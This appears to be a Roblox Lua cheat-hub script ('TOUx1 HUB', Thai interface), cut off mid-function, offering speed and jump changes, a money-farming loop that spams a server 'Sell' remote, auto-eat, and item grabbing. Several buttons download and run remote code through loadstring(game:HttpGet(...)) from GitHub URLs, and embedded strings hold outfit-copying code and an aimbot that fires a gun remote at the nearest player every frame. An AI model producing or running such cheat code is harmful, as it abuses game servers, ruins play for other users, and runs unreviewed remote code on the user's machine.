local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoid = character:WaitForChild("Humanoid")

local screenGui = Instance.new("ScreenGui")
screenGui.ResetOnSpawn = false
screenGui.Parent = player:WaitForChild("PlayerGui")

local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(0, 500, 0, 300)
mainFrame.Position = UDim2.new(0.5, -250, 0.5, -150)
mainFrame.BackgroundColor3 = Color3.fromRGB(100,100,100)
mainFrame.BorderSizePixel = 0
mainFrame.Active = true
mainFrame.Draggable = true
mainFrame.Parent = screenGui

local UserInputService = game:GetService("UserInputService")
local dragging, dragInput, dragStart, startPos

local function updateInput(input)
    local delta = input.Position - dragStart
    mainFrame.Position = UDim2.new(
        startPos.X.Scale, startPos.X.Offset + delta.X,
        startPos.Y.Scale, startPos.Y.Offset + delta.Y
    )
end

mainFrame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 
    or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = mainFrame.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)

mainFrame.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement 
    or input.UserInputType == Enum.UserInputType.Touch then
        dragInput = input
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if dragging and input == dragInput then
        updateInput(input)
    end
end)

local sideBar = Instance.new("Frame")
sideBar.Size = UDim2.new(0, 120, 1, 0)
sideBar.BackgroundColor3 = Color3.fromRGB(80,80,80)
sideBar.BorderSizePixel = 0
sideBar.Parent = mainFrame

local byText = Instance.new("TextLabel")
byText.Size = UDim2.new(1,0,0,40)
byText.BackgroundTransparency = 1
byText.Text = "by:TOU"
byText.TextColor3 = Color3.fromRGB(255,255,255)
byText.TextSize = 20
byText.Font = Enum.Font.GothamBold
byText.Parent = sideBar

local homeButton = Instance.new("TextButton")
homeButton.Size = UDim2.new(0,110,0,40)
homeButton.Position = UDim2.new(0,5,0,50)
homeButton.BackgroundColor3 = Color3.fromRGB(60,60,60)
homeButton.Text = "หน้าหลัก"
homeButton.TextColor3 = Color3.fromRGB(255,255,255)
homeButton.TextSize = 18
homeButton.Font = Enum.Font.Gotham
homeButton.Parent = sideBar

local playerButton = Instance.new("TextButton")
playerButton.Size = UDim2.new(0,110,0,40)
playerButton.Position = UDim2.new(0,5,0,95)
playerButton.BackgroundColor3 = Color3.fromRGB(60,60,60)
playerButton.Text = "ผู้เล่น"
playerButton.TextColor3 = Color3.fromRGB(255,255,255)
playerButton.TextSize = 18
playerButton.Font = Enum.Font.Gotham
playerButton.Parent = sideBar

local scriptButton = Instance.new("TextButton")
scriptButton.Size = UDim2.new(0,110,0,40)
scriptButton.Position = UDim2.new(0,5,0,140)
scriptButton.BackgroundColor3 = Color3.fromRGB(60,60,60)
scriptButton.Text = "Script"
scriptButton.TextColor3 = Color3.fromRGB(255,255,255)
scriptButton.TextSize = 18
scriptButton.Font = Enum.Font.Gotham
scriptButton.Parent = sideBar

local scriptUIButton = Instance.new("TextButton")
scriptUIButton.Size = UDim2.new(0,110,0,40)
scriptUIButton.Position = UDim2.new(0,5,0,185)
scriptUIButton.BackgroundColor3 = Color3.fromRGB(60,60,60)
scriptUIButton.Text = "script ui"
scriptUIButton.TextColor3 = Color3.fromRGB(255,255,255)
scriptUIButton.TextSize = 18
scriptUIButton.Font = Enum.Font.Gotham
scriptUIButton.Parent = sideBar

local hubText = Instance.new("TextLabel")
hubText.Size = UDim2.new(1,-120,0,40)
hubText.Position = UDim2.new(0,120,0,0)
hubText.BackgroundTransparency = 1
hubText.Text = "TOUx1 HUB"
hubText.TextColor3 = Color3.fromRGB(255,255,255)
hubText.TextSize = 20
hubText.Font = Enum.Font.GothamBold
hubText.Parent = mainFrame

local closeButton = Instance.new("TextButton")
closeButton.Size = UDim2.new(0,30,0,30)
closeButton.Position = UDim2.new(1,-40,0,5)
closeButton.BackgroundColor3 = Color3.fromRGB(255,0,0)
closeButton.Text = "X"
closeButton.TextColor3 = Color3.fromRGB(255,255,255)
closeButton.TextSize = 20
closeButton.Parent = mainFrame

local contentFrame = Instance.new("Frame")
contentFrame.Size = UDim2.new(1,-120,1,-40)
contentFrame.Position = UDim2.new(0,120,0,40)
contentFrame.BackgroundTransparency = 1
contentFrame.Parent = mainFrame

local minimizeFrame = Instance.new("Frame")
minimizeFrame.Size = UDim2.new(0, 50, 0, 50)
minimizeFrame.Position = UDim2.new(0, 10, 0, 10)
minimizeFrame.BackgroundTransparency = 1
minimizeFrame.Active = true
minimizeFrame.Parent = screenGui
minimizeFrame.Visible = false

local openButton = Instance.new("ImageButton")
openButton.Size = UDim2.new(1, 0, 1, 0)
openButton.BackgroundTransparency = 1
openButton.Image = "rbxassetid://106575147804507"
openButton.Parent = minimizeFrame

local minDragging, minDragInput, minDragStart, minStartPos

local function minUpdateInput(input)
    local delta = input.Position - minDragStart
    minimizeFrame.Position = UDim2.new(
        minStartPos.X.Scale, minStartPos.X.Offset + delta.X,
        minStartPos.Y.Scale, minStartPos.Y.Offset + delta.Y
    )
end

minimizeFrame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 
    or input.UserInputType == Enum.UserInputType.Touch then
        minDragging = true
        minDragStart = input.Position
        minStartPos = minimizeFrame.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                minDragging = false
            end
        end)
    end
end)

minimizeFrame.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement 
    or input.UserInputType == Enum.UserInputType.Touch then
        minDragInput = input
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if minDragging and input == minDragInput then
        minUpdateInput(input)
    end
end)

closeButton.MouseButton1Click:Connect(function()
    mainFrame.Visible = false
    minimizeFrame.Visible = true
end)

openButton.MouseButton1Click:Connect(function()
    minimizeFrame.Visible = false
    mainFrame.Visible = true
end)

player.CharacterAdded:Connect(function(newCharacter)
    character = newCharacter
    humanoid = newCharacter:WaitForChild("Humanoid")
    if contentFrame.Visible then
        showHome()
    end
end)
local function clearContent()
    for _, child in pairs(contentFrame:GetChildren()) do
        child:Destroy()
    end
end

local function showHome()
    clearContent()
    local profileImage = Instance.new("ImageLabel")
    profileImage.Size = UDim2.new(0,60,0,60)
    profileImage.Position = UDim2.new(0,10,0,10)
    profileImage.BackgroundTransparency = 1
    profileImage.Image = "rbxthumb://type=AvatarHeadShot&id="..player.UserId.."&w=150&h=150"
    profileImage.Parent = contentFrame

    local nameLabel = Instance.new("TextLabel")
    nameLabel.Size = UDim2.new(1,-80,0,30)
    nameLabel.Position = UDim2.new(0,80,0,15)
    nameLabel.BackgroundTransparency = 1
    nameLabel.Text = "ชื่อ: "..player.Name
    nameLabel.TextColor3 = Color3.fromRGB(255,255,255)
    nameLabel.TextSize = 18
    nameLabel.Font = Enum.Font.Gotham
    nameLabel.TextXAlignment = Enum.TextXAlignment.Left
    nameLabel.Parent = contentFrame

    local ageLabel = Instance.new("TextLabel")
    ageLabel.Size = UDim2.new(1,-80,0,30)
    ageLabel.Position = UDim2.new(0,80,0,50)
    ageLabel.BackgroundTransparency = 1
    ageLabel.Text = "จำนวนวันที่สร้าง: "..player.AccountAge.." วัน"
    ageLabel.TextColor3 = Color3.fromRGB(255,255,255)
    ageLabel.TextSize = 18
    ageLabel.Font = Enum.Font.Gotham
    ageLabel.TextXAlignment = Enum.TextXAlignment.Left
    ageLabel.Parent = contentFrame

    local creatorLabel = Instance.new("TextLabel")
    creatorLabel.Size = UDim2.new(1,-20,0,50)
    creatorLabel.Position = UDim2.new(0,10,0,90)
    creatorLabel.BackgroundTransparency = 1
    creatorLabel.Text = "คนสร้าง @TOUx1 สร้าง GUI , script \nคนช่วยสร้าง @wino444 สร้าง script หยิบของ"
    creatorLabel.TextColor3 = Color3.fromRGB(255,255,255)
    creatorLabel.TextSize = 16
    creatorLabel.Font = Enum.Font.Gotham
    creatorLabel.TextXAlignment = Enum.TextXAlignment.Left
    creatorLabel.TextYAlignment = Enum.TextYAlignment.Top
    creatorLabel.TextWrapped = true
    creatorLabel.Parent = contentFrame
end

local function showPlayer()
    clearContent()
    -- Speed
    local speedLabel = Instance.new("TextLabel")
    speedLabel.Size = UDim2.new(0,150,0,30)
    speedLabel.Position = UDim2.new(0,10,0,20)
    speedLabel.BackgroundTransparency = 1
    speedLabel.Text = "ความเร็ว: "..humanoid.WalkSpeed
    speedLabel.TextColor3 = Color3.fromRGB(255,255,255)
    speedLabel.TextSize = 18
    speedLabel.Font = Enum.Font.Gotham
    speedLabel.TextXAlignment = Enum.TextXAlignment.Left
    speedLabel.Parent = contentFrame

    local speedBox = Instance.new("TextBox")
    speedBox.Size = UDim2.new(0,80,0,30)
    speedBox.Position = UDim2.new(0,170,0,20)
    speedBox.BackgroundColor3 = Color3.fromRGB(128,128,128)
    speedBox.Text = tostring(humanoid.WalkSpeed)
    speedBox.TextColor3 = Color3.fromRGB(255,255,255)
    speedBox.TextSize = 18
    speedBox.Parent = contentFrame

    speedBox.FocusLost:Connect(function(enter)
        if enter then
            local newSpeed = tonumber(speedBox.Text)
            if newSpeed and newSpeed > 0 and newSpeed <= 500 then
                humanoid.WalkSpeed = newSpeed
                speedLabel.Text = "ความเร็ว: "..newSpeed
            else
                speedBox.Text = tostring(humanoid.WalkSpeed)
            end
        end
    end)

    -- Jump
    local jumpLabel = Instance.new("TextLabel")
    jumpLabel.Size = UDim2.new(0,150,0,30)
    jumpLabel.Position = UDim2.new(0,10,0,60)
    jumpLabel.BackgroundTransparency = 1
    jumpLabel.Text = "กระโดด: "..humanoid.JumpPower
    jumpLabel.TextColor3 = Color3.fromRGB(255,255,255)
    jumpLabel.TextSize = 18
    jumpLabel.Font = Enum.Font.Gotham
    jumpLabel.TextXAlignment = Enum.TextXAlignment.Left
    jumpLabel.Parent = contentFrame

    local jumpBox = Instance.new("TextBox")
    jumpBox.Size = UDim2.new(0,80,0,30)
    jumpBox.Position = UDim2.new(0,170,0,60)
    jumpBox.BackgroundColor3 = Color3.fromRGB(128,128,128)
    jumpBox.Text = tostring(humanoid.JumpPower)
    jumpBox.TextColor3 = Color3.fromRGB(255,255,255)
    jumpBox.TextSize = 18
    jumpBox.Parent = contentFrame

    jumpBox.FocusLost:Connect(function(enter)
        if enter then
            local newJump = tonumber(jumpBox.Text)
            if newJump and newJump > 0 and newJump <= 500 then
                humanoid.JumpPower = newJump
                jumpLabel.Text = "กระโดด: "..newJump
            else
                jumpBox.Text = tostring(humanoid.JumpPower)
            end
        end
    end)

    local respawnLabel = Instance.new("TextLabel")
    respawnLabel.Size = UDim2.new(0,150,0,30)
    respawnLabel.Position = UDim2.new(0,10,0,100)
    respawnLabel.BackgroundTransparency = 1
    respawnLabel.Text = "เกิดกลับที่"
    respawnLabel.TextColor3 = Color3.fromRGB(255,255,255)
    respawnLabel.TextSize = 18
    respawnLabel.Font = Enum.Font.Gotham
    respawnLabel.TextXAlignment = Enum.TextXAlignment.Left
    respawnLabel.Parent = contentFrame

    local respawnButton = Instance.new("TextButton")
    respawnButton.Size = UDim2.new(0,80,0,30)
    respawnButton.Position = UDim2.new(0,170,0,100)
    respawnButton.BackgroundColor3 = Color3.fromRGB(60,60,60)
    respawnButton.Text = "ปิด"
    respawnButton.TextColor3 = Color3.fromRGB(255,255,255)
    respawnButton.TextSize = 18
    respawnButton.Parent = contentFrame

    respawnButton.MouseButton1Click:Connect(function()
        respawnAtDeathPos = not respawnAtDeathPos
        respawnButton.Text = respawnAtDeathPos and "เปิด" or "ปิด"
        if respawnAtDeathPos then
            if _G.ReviveBackConnection then _G.ReviveBackConnection:Disconnect() end
            _G.LastDeathPos = nil
            _G.ReviveBackConnection = player.CharacterAdded:Connect(function(char)
                task.wait(0.5)
                local hrp = char:WaitForChild("HumanoidRootPart")
                if _G.LastDeathPos then
                    hrp.CFrame = _G.LastDeathPos
                end
            end)
            task.spawn(function()
                while player.Character do
                    local char = player.Character
                    local humanoid = char:FindFirstChildOfClass("Humanoid")
                    if humanoid and humanoid.Health <= 0 then
                        local hrp = char:FindFirstChild("HumanoidRootPart")
                        if hrp then
                            _G.LastDeathPos = hrp.CFrame
                        end
                    end
                    task.wait(0.2)
                end
            end)
        else
            if _G.ReviveBackConnection then
                _G.ReviveBackConnection:Disconnect()
                _G.ReviveBackConnection = nil
            end
            _G.LastDeathPos = nil
        end
    end)
end

local moneyLoop = false
local loopSpeed = 0.1
local autoEat = false

local function showScript()
    clearContent()

    local pumpLabel = Instance.new("TextLabel")
    pumpLabel.Size = UDim2.new(0,100,0,30)
    pumpLabel.Position = UDim2.new(0,10,0,20)
    pumpLabel.BackgroundTransparency = 1
    pumpLabel.Text = "ปั้มเงิน"
    pumpLabel.TextColor3 = Color3.fromRGB(255,255,255)
    pumpLabel.TextSize = 18
    pumpLabel.Font = Enum.Font.Gotham
    pumpLabel.TextXAlignment = Enum.TextXAlignment.Left
    pumpLabel.Parent = contentFrame

    local toggleButton = Instance.new("TextButton")
    toggleButton.Size = UDim2.new(0,80,0,30)
    toggleButton.Position = UDim2.new(0,120,0,20)
    toggleButton.BackgroundColor3 = Color3.fromRGB(60,60,60)
    toggleButton.Text = "OFF"
    toggleButton.TextColor3 = Color3.fromRGB(255,255,255)
    toggleButton.TextSize = 18
    toggleButton.Parent = contentFrame

    local speedBox = Instance.new("TextBox")
    speedBox.Size = UDim2.new(0,60,0,30)
    speedBox.Position = UDim2.new(0,210,0,20)
    speedBox.BackgroundColor3 = Color3.fromRGB(128,128,128)
    speedBox.Text = tostring(loopSpeed)
    speedBox.TextColor3 = Color3.fromRGB(255,255,255)
    speedBox.TextSize = 18
    speedBox.Parent = contentFrame

    speedBox.FocusLost:Connect(function(enter)
        if enter then
            local val = tonumber(speedBox.Text)
            if val and val > 0 then loopSpeed = val else speedBox.Text = tostring(loopSpeed) end
        end
    end)

    toggleButton.MouseButton1Click:Connect(function()
        moneyLoop = not moneyLoop
        toggleButton.Text = moneyLoop and "ON" or "OFF"
        spawn(function()
            while moneyLoop do
                local args = {"Sell"}
                game:GetService("ReplicatedStorage"):WaitForChild("House"):FireServer(unpack(args))
                wait(loopSpeed)
            end
        end)
    end)

    local animLabel = Instance.new("TextLabel")
    animLabel.Size = UDim2.new(0,120,0,30)
    animLabel.Position = UDim2.new(0,10,0,70)
    animLabel.BackgroundTransparency = 1
    animLabel.Text = "อนิเมชั่น SFX"
    animLabel.TextColor3 = Color3.fromRGB(255,255,255)
    animLabel.TextSize = 18
    animLabel.Font = Enum.Font.Gotham
    animLabel.TextXAlignment = Enum.TextXAlignment.Left
    animLabel.Parent = contentFrame

    local animButton = Instance.new("TextButton")
    animButton.Size = UDim2.new(0,80,0,30)
    animButton.Position = UDim2.new(0,140,0,70)
    animButton.BackgroundColor3 = Color3.fromRGB(60,60,60)
    animButton.Text = "เปิด"
    animButton.TextColor3 = Color3.fromRGB(255,255,255)
    animButton.TextSize = 18
    animButton.Parent = contentFrame

    animButton.MouseButton1Click:Connect(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/TOUx1/Roblox-script/refs/heads/main/Animation%20sfx?update="..tick()))()
    end)

    local handcuffLabel = Instance.new("TextLabel")
    handcuffLabel.Size = UDim2.new(0,120,0,30)
    handcuffLabel.Position = UDim2.new(0,10,0,120)
    handcuffLabel.BackgroundTransparency = 1
    handcuffLabel.Text = "หยิบกุญแจมือ"
    handcuffLabel.TextColor3 = Color3.fromRGB(255,255,255)
    handcuffLabel.TextSize = 18
    handcuffLabel.Font = Enum.Font.Gotham
    handcuffLabel.TextXAlignment = Enum.TextXAlignment.Left
    handcuffLabel.Parent = contentFrame

    local handcuffButton = Instance.new("TextButton")
    handcuffButton.Size = UDim2.new(0,80,0,30)
    handcuffButton.Position = UDim2.new(0,140,0,120)
    handcuffButton.BackgroundColor3 = Color3.fromRGB(60,60,60)
    handcuffButton.Text = "หยิบ"
    handcuffButton.TextColor3 = Color3.fromRGB(255,255,255)
    handcuffButton.TextSize = 18
    handcuffButton.Parent = contentFrame

    handcuffButton.MouseButton1Click:Connect(function()
        local CollectModule = loadstring(game:HttpGet("https://raw.githubusercontent.com/wino444/wino444_CollectModule/main/.lua"))()
        _G.AutoCollectModule.CollectItemByName("Handcuff")
    end)

    local autoEatLabel = Instance.new("TextLabel")
    autoEatLabel.Size = UDim2.new(0,120,0,30)
    autoEatLabel.Position = UDim2.new(0,10,0,170)
    autoEatLabel.BackgroundTransparency = 1
    autoEatLabel.Text = "อ้อโต้กินข้าว"
    autoEatLabel.TextColor3 = Color3.fromRGB(255,255,255)
    autoEatLabel.TextSize = 18
    autoEatLabel.Font = Enum.Font.Gotham
    autoEatLabel.TextXAlignment = Enum.TextXAlignment.Left
    autoEatLabel.Parent = contentFrame

    local autoEatButton = Instance.new("TextButton")
    autoEatButton.Size = UDim2.new(0,100,0,30)
    autoEatButton.Position = UDim2.new(0,140,0,170)
    autoEatButton.BackgroundColor3 = Color3.fromRGB(60,60,60)
    autoEatButton.Text = "อ้อโต้"
    autoEatButton.TextColor3 = Color3.fromRGB(255,255,255)
    autoEatButton.TextSize = 18
    autoEatButton.Parent = contentFrame

    autoEatButton.MouseButton1Click:Connect(function()
        autoEat = not autoEat
        autoEatButton.Text = autoEat and "ปิด" or "อ้อโต้"
        if autoEat then
            local CollectModule = loadstring(game:HttpGet("https://raw.githubusercontent.com/wino444/wino444_CollectModule/main/.lua"))()
            _G.AutoCollectModule.CollectItemByName("Tom Yum Kung")
            spawn(function()
                local hungry = player:WaitForChild("Hungry")
                local vim = game:GetService("VirtualInputManager")
                while autoEat do
                    if hungry.Value <= 50 then
                        while hungry.Value < 100 and autoEat do
                            local CollectModule = loadstring(game:HttpGet("https://raw.githubusercontent.com/wino444/wino444_CollectModule/main/.lua"))()
                            _G.AutoCollectModule.CollectItemByName("Tom Yum Kung")
                            wait(0.5)
                            local tool = player.Backpack:FindFirstChild("tom yum kung")
                            if tool then
                                humanoid:EquipTool(tool)
                                wait(0.1)
                                tool = character:FindFirstChild("tom yum kung")
                                if tool then
                                    while autoEat and hungry.Value < 100 and tool.Parent == character do
                                        vim:SendMouseButtonEvent(0, 0, 0, true, game, 0)
                                        wait(0.05)
                                        vim:SendMouseButtonEvent(0, 0, 0, false, game, 0)
                                        wait(1)
                                    end
                                end
                            else
                                wait(1)
                            end
                        end
                    end
                    wait(1)
                end
            end)
        end
    end)

    local buyGunLabel = Instance.new("TextLabel")
    buyGunLabel.Size = UDim2.new(0,100,0,30)
    buyGunLabel.Position = UDim2.new(0,10,0,220)
    buyGunLabel.BackgroundTransparency = 1
    buyGunLabel.Text = "ซื้อปืน"
    buyGunLabel.TextColor3 = Color3.fromRGB(255,255,255)
    buyGunLabel.TextSize = 18
    buyGunLabel.Font = Enum.Font.Gotham
    buyGunLabel.TextXAlignment = Enum.TextXAlignment.Left
    buyGunLabel.Parent = contentFrame

    local buyGunButton = Instance.new("TextButton")
    buyGunButton.Size = UDim2.new(0,80,0,30)
    buyGunButton.Position = UDim2.new(0,120,0,220)
    buyGunButton.BackgroundColor3 = Color3.fromRGB(60,60,60)
    buyGunButton.Text = "ซื้อ"
    buyGunButton.TextColor3 = Color3.fromRGB(255,255,255)
    buyGunButton.TextSize = 18
    buyGunButton.Parent = contentFrame

    buyGunButton.MouseButton1Click:Connect(function()
        local CollectModule = loadstring(game:HttpGet("https://raw.githubusercontent.com/wino444/wino444_CollectModule/main/.lua"))()
        _G.AutoCollectModule.CollectItemByName("M4")
    end)
end
local copyOutfitCode = [[
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "CopyOutfitUI"
ScreenGui.Parent = game.CoreGui

local Frame = Instance.new("Frame")
Frame.Size = UDim2.new(0, 270, 0, 210)
Frame.Position = UDim2.new(0.5, -135, 0.5, -105)
Frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Frame.BorderSizePixel = 0
Frame.Active = true
Frame.Draggable = true
Frame.Parent = ScreenGui

local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, 0, 0, 30)
Title.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
Title.Text = "Copy Outfit Tool"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 16
Title.Parent = Frame

local NameBox = Instance.new("TextBox")
NameBox.Size = UDim2.new(1, -20, 0, 30)
NameBox.Position = UDim2.new(0, 10, 0, 50)
NameBox.PlaceholderText = "ใส่ชื่อผู้เล่น (ไม่ต้องเต็ม)"
NameBox.Text = ""
NameBox.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
NameBox.TextColor3 = Color3.fromRGB(255, 255, 255)
NameBox.ClearTextOnFocus = false
NameBox.Font = Enum.Font.Gotham
NameBox.TextSize = 14
NameBox.Parent = Frame

local CopyButton = Instance.new("TextButton")
CopyButton.Size = UDim2.new(1, -20, 0, 40)
CopyButton.Position = UDim2.new(0, 10, 0, 100)
CopyButton.Text = "Copy Outfit"
CopyButton.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
CopyButton.TextColor3 = Color3.fromRGB(255, 255, 255)
CopyButton.Font = Enum.Font.GothamBold
CopyButton.TextSize = 16
CopyButton.Parent = Frame

local CopyClosestButton = Instance.new("TextButton")
CopyClosestButton.Size = UDim2.new(1, -20, 0, 40)
CopyClosestButton.Position = UDim2.new(0, 10, 0, 150)
CopyClosestButton.Text = "Copy คนที่อยู่ใกล้สุด"
CopyClosestButton.BackgroundColor3 = Color3.fromRGB(255, 140, 0)
CopyClosestButton.TextColor3 = Color3.fromRGB(255, 255, 255)
CopyClosestButton.Font = Enum.Font.GothamBold
CopyClosestButton.TextSize = 16
CopyClosestButton.Parent = Frame

local function FindPlayerByPartialName(partName)
	partName = string.lower(partName)
	for _, plr in ipairs(Players:GetPlayers()) do
		if string.find(string.lower(plr.Name), partName) then
			return plr
		end
	end
	return nil
end
local function ExtractId(id)
	if type(id) == "string" then
		return tonumber(id:match("%d+")) or 0
	end
	return tonumber(id) or 0
end

local function GetPlayerOutfitData(targetName)
	local targetPlayer = FindPlayerByPartialName(targetName)
	if not targetPlayer then
		warn("ไม่พบผู้เล่น: " .. targetName)
		return nil
	end

	local character = targetPlayer.Character
	if not character then
		warn("ไม่พบตัวละครผู้เล่น")
		return nil
	end

	local humanoid = character:FindFirstChildOfClass("Humanoid")
	if not humanoid then
		warn("ไม่พบ Humanoid")
		return nil
	end

	local desc = humanoid:GetAppliedDescription()

	local accessories = {}

	for _, acc in ipairs(desc:GetAccessories(true)) do
		table.insert(accessories, {
			Rotation = Vector3.new(0, 0, 0),
			AssetId = ExtractId(acc.AssetId),
			Position = Vector3.new(0, 0, 0),
			Scale = Vector3.new(1, 1, 1),
			IsLayered = acc.IsLayered or false,
			AccessoryType = acc.AccessoryType
		})
	end

	local faceId = ExtractId(desc.Face)

	return {{
		Shirt = ExtractId(desc.Shirt),
		Pants = ExtractId(desc.Pants),
		GraphicTShirt = ExtractId(desc.GraphicTShirt),
		Face = faceId,
		LeftArm = ExtractId(desc.LeftArm),
		RightArm = ExtractId(desc.RightArm),
		Torso = ExtractId(desc.Torso),
		LeftLeg = ExtractId(desc.LeftLeg),
		RightLeg = ExtractId(desc.RightLeg),
		Head = ExtractId(desc.Head),
		Accessories = accessories,

		HeadColor = desc.HeadColor,
		LeftArmColor = desc.LeftArmColor,
		RightArmColor = desc.RightArmColor,
		TorsoColor = desc.TorsoColor,
		LeftLegColor = desc.LeftLegColor,
		RightLegColor = desc.RightLegColor,

		BodyTypeScale = desc.BodyTypeScale,
		DepthScale = desc.DepthScale,
		HeadScale = desc.HeadScale,
		HeightScale = desc.HeightScale,
		ProportionScale = desc.ProportionScale,
		WidthScale = desc.WidthScale,

		RunAnimation = ExtractId(desc.RunAnimation),
		WalkAnimation = ExtractId(desc.WalkAnimation),
		JumpAnimation = ExtractId(desc.JumpAnimation),
		IdleAnimation = ExtractId(desc.IdleAnimation),
		FallAnimation = ExtractId(desc.FallAnimation),
		ClimbAnimation = ExtractId(desc.ClimbAnimation),
		SwimAnimation = ExtractId(desc.SwimAnimation),
		MoodAnimation = ExtractId(desc.MoodAnimation)
	}}
end
CopyButton.MouseButton1Click:Connect(function()
	local name = NameBox.Text
	if name ~= "" then
		local outfitData = GetPlayerOutfitData(name)
		if outfitData then
			local remote = ReplicatedStorage:WaitForChild("BloxbizRemotes"):WaitForChild("CatalogOnApplyOutfit")
			remote:FireServer(unpack(outfitData))
			print("✅ Copy Outfit สำเร็จ: " .. name)
		else
			warn("❌ ไม่สามารถ Copy Outfit ได้")
		end
	end
end)
local function FindClosestPlayer()
	local closestPlayer = nil
	local shortestDistance = math.huge
	local myCharacter = LocalPlayer.Character
	if not myCharacter or not myCharacter:FindFirstChild("HumanoidRootPart") then
		return nil
	end
	local myPos = myCharacter.HumanoidRootPart.Position

	for _, plr in ipairs(Players:GetPlayers()) do
		if plr ~= LocalPlayer and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
			local dist = (plr.Character.HumanoidRootPart.Position - myPos).Magnitude
			if dist < shortestDistance then
				shortestDistance = dist
				closestPlayer = plr
			end
		end
	end

	return closestPlayer
end
CopyClosestButton.MouseButton1Click:Connect(function()
	local closest = FindClosestPlayer()
	if closest then
		local outfitData = GetPlayerOutfitData(closest.Name)
		if outfitData then
			local remote = ReplicatedStorage:WaitForChild("BloxbizRemotes"):WaitForChild("CatalogOnApplyOutfit")
			remote:FireServer(unpack(outfitData))
			print("✅ Copy Outfit จาก " .. closest.Name)
		else
			warn("❌ ไม่สามารถ Copy Outfit ได้")
		end
	else
		warn("❌ ไม่พบผู้เล่นที่อยู่ใกล้ที่สุด")
	end
end)
]]

local aimbotCode = [[
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local RunService = game:GetService("RunService")

local aimbotEnabled = false

local function findNearestPlayer()
    local closestPlayer = nil
    local shortestDistance = math.huge
    local character = LocalPlayer.Character
    if not character or not character:FindFirstChild("HumanoidRootPart") then return nil end
    
    for _, player in pairs(Players:GetPlayers()) do
        if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            local distance = (character.HumanoidRootPart.Position - player.Character.HumanoidRootPart.Position).Magnitude
            if distance < shortestDistance then
                shortestDistance = distance
                closestPlayer = player
            end
        end
    end
    return closestPlayer
end

local function fireGun(targetPosition)
    local character = LocalPlayer.Character
    local gun = character and character:FindFirstChild("Gun")
    if not gun then return end
    
    local shotRemote = gun:FindFirstChild("shot")
    if shotRemote and shotRemote:IsA("RemoteEvent") then
        shotRemote:FireServer(targetPosition)
    end
end
local playerGui = LocalPlayer:WaitForChild("PlayerGui")
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "AimbotUI"
screenGui.Parent = playerGui
screenGui.ResetOnSpawn = false

local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(0, 240, 0, 120)
mainFrame.Position = UDim2.new(0.05, 0, 0.7, 0)
mainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 30)
mainFrame.Active = true
mainFrame.Draggable = true
mainFrame.Parent = screenGui

local frameCorner = Instance.new("UICorner")
frameCorner.CornerRadius = UDim.new(0, 15)
frameCorner.Parent = mainFrame

local shadow = Instance.new("UIStroke")
shadow.Color = Color3.fromRGB(0, 255, 255)
shadow.Thickness = 2
shadow.Parent = mainFrame

local aimbotButton = Instance.new("TextButton")
aimbotButton.Size = UDim2.new(0, 200, 0, 60)
aimbotButton.Position = UDim2.new(0.5, -100, 0.5, -30)
aimbotButton.BackgroundColor3 = Color3.fromRGB(25, 25, 60)
aimbotButton.TextColor3 = Color3.fromRGB(0, 255, 255)
aimbotButton.Text = "Aimbot: OFF"
aimbotButton.TextSize = 22
aimbotButton.Font = Enum.Font.FredokaOne
aimbotButton.Parent = mainFrame

local buttonCorner = Instance.new("UICorner")
buttonCorner.CornerRadius = UDim.new(0, 12)
buttonCorner.Parent = aimbotButton

aimbotButton.MouseButton1Click:Connect(function()
    aimbotEnabled = not aimbotEnabled
    if aimbotEnabled then
        aimbotButton.Text = "Aimbot: ON"
        aimbotButton.TextColor3 = Color3.fromRGB(255, 0, 255)
        aimbotButton.BackgroundColor3 = Color3.fromRGB(0, 60, 120)
    else
        aimbotButton.Text = "Aimbot: OFF"
        aimbotButton.TextColor3 = Color3.fromRGB(0, 255, 255)
        aimbotButton.BackgroundColor3 = Color3.fromRGB(25, 25, 60)
    end
end)

RunService.RenderStepped:Connect(function()
    if aimbotEnabled then
        local targetPlayer = findNearestPlayer()
        if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
            fireGun(targetPlayer.Character.HumanoidRootPart.Position)
        end
    end
end)
]]

local function showScriptUI()
    clearContent()
    
    local aimbotLabel = Instance.new("TextLabel")
    aimbotLabel.Size = UDim2.new(0,120,0,30)
    aimbotLabel.Position = UDim2.new(0,10,0,20)
    aimbotLabel.BackgroundTransparency = 1
    aimbotLabel.Text = "aimbot"
    aimbotLabel.TextColor3 = Color3.fromRGB(255,255,255)
    aimbotLabel.TextSize = 18
    aimbotLabel.Font = Enum.Font.Gotham
    aimbotLabel.TextXAlignment = Enum.TextXAlignment.Left
    aimbotLabel.Parent = contentFrame

    local aimbotButton = Instance.new("TextButton")
    aimbotButton.Size = UDim2.new(0,80,0,30)
    aimbotButton.Position = UDim2.new(0,140,0,20)
    aimbotButton.BackgroundColor3 = Color3.fromRGB(60,60,60)
